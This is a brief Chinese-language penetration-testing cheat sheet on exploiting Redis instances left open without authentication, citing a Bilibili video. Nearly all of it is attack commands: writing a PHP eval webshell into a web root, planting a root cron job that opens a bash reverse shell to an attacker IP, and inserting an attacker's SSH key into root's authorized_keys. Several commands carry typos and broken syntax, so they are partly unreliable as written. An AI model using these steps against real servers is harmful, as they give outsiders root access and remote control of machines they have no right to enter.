Redis
```php
https://www.bilibili.com/video/BV163411972n?p=39&spm_id_from=pageDriver

redis (6379)= key-value database 高速讀寫儲存緩存
nmap -v -Pn -p 6379 -sV --script="redis-info"
##redis-cli.exe. -h <ip> -p 6379
1.未授權訪問  webshell 需要知道根目錄
#config set dir /var/www/SSRF/    (apche)登入絕對目錄
#config set dir var/share/nginx/  (nginx)
#config set dbfilesnmap shell.php
#set x "<?php @eval($_POST['test']).?>"
#save
2. 未授權訪問 reves shell
#config set dir /var/spool/cron/crontabs
#config set dbfilename root
#set xss "\n\n*/1 * * * * bash -i >&/dev/tcp/<ip>/1234 0>&1\n"
#save
3. 寫公鑰
#ssh-keygen -t rsa
默認下會在./home的.ssh目錄下
（echo -e "\n\n";cat ~/.ssh/id_rsa.pub; echo -e"\n\n*) > /tmp/foo.txt
#cat /tmp/foo.txt | redis-cli -h <ip> -p 6379 -x set crackit
#redis-cli -h <ip> -p 6379
#config set /root/.ssh/
#config set dbfilename "authorized_keys"
#save
#ssh root@<ip> -i ~/.ssh/id_rsa




```
